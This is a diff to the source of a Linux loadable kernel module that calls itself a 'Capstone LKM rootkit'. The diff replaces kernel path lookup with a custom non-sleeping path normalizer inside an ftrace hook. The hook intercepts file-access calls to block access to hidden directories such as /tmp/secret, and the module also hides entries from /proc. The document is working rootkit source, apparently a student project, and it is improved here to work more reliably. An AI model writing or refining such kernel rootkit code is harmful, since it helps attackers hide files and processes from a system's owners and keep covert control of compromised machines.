@@ -24,7 +24,6 @@
 #include <linux/ftrace.h>
 #include <linux/kprobes.h>
 #include <linux/cred.h>
-#include <linux/namei.h>
 
 #include "rootkit.h"
 
@@ -37,13 +36,70 @@ MODULE_DESCRIPTION("Capstone LKM rootkit, access blocking with path protection")
 static unsigned long target_func_addr;
 bool blocking_active;
 
+static char *normalize_path(const char *src, char *dst, size_t dlen)
+{
+  const char *p = src;
+  char *out = dst;
+  char *end = dst + dlen - 1;
+  char *slash_stack[64];
+  int sp = 0;
+
+  if (!src || !dst || dlen < 2)
+    return NULL;
+
+  if (*p != '/') {
+    strncpy(dst, src, dlen - 1);
+    dst[dlen - 1] = '\0';
+    return dst;
+  }
+
+  *out++ = '/';
+  slash_stack[sp++] = dst;
+  p++;
+
+  while (*p && out < end) {
+    if (*p == '/') { p++; continue; }
+
+    if (p[0] == '.' && (p[1] == '/' || p[1] == '\0')) {
+      p += 1 + (p[1] == '/');
+      continue;
+    }
+
+    if (p[0] == '.' && p[1] == '.' && (p[2] == '/' || p[2] == '\0')) {
+      p += 2 + (p[2] == '/');
+      if (sp > 1) {
+        sp--;
+        out = slash_stack[sp] + 1;
+      } else {
+        out = dst + 1;
+      }
+      continue;
+    }
+
+    if (sp < 64)
+      slash_stack[sp++] = out - 1;
+
+    while (*p && *p != '/' && out < end)
+      *out++ = *p++;
+    if (*p == '/') {
+      if (out < end) *out++ = '/';
+      p++;
+    }
+  }
+
+  if (out > dst + 1 && *(out - 1) == '/')
+    out--;
+
+  *out = '\0';
+  return dst;
+}
 
 static void notrace blocking_callback(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct ftrace_regs *fregs)
 {
   int ret;
   char raw_buf[MAX_PATH_LEN];
   char resolved_buf[MAX_PATH_LEN];
-  struct path resolved_path;
+  //struct path resolved_path;
   char *resolved;
   size_t hd1_len = sizeof(HIDDEN_DIR_1) - 1;
   size_t hd2_len = sizeof(HIDDEN_DIR_2) - 1;
@@ -51,22 +107,16 @@ static void notrace blocking_callback(unsigned long ip, unsigned long parent_ip,
   if (!blocking_active) 
     return;
 
-  //user to kernel buffer -> kern_path -> d_path return value -> path_put
+  //user to kernel buffer -> normalize_path (pure string, no sleeping)
   const char __user *filename = (const char __user *)ftrace_regs_get_argument(fregs, 1);
 
   ret = strncpy_from_user(raw_buf, filename, sizeof(raw_buf));
   if (ret < 0)
     return;
 
-  if (kern_path(raw_buf, LOOKUP_FOLLOW, &resolved_path) == 0) {
-    resolved = d_path(&resolved_path, resolved_buf, sizeof(resolved_buf));
-    path_put(&resolved_path);
-
-    if (IS_ERR(resolved))
-      return;
-  } else {
+  resolved = normalize_path(raw_buf, resolved_buf, sizeof(resolved_buf));
+  if(!resolved)
     resolved = raw_buf;
-  }
 
   // check against /tmp/secret
   if (strncmp(resolved, HIDDEN_DIR_1, hd1_len) == 0){  
@@ -196,7 +246,7 @@ errorpoint1:
 
 static void __exit rootkit_exit(void)
 {
-	pr_info("[rootkit] cleaning up\n");
+  pr_info("[rootkit] cleaning up\n");
 	
   blocking_exit();
   proc_hide_exit();
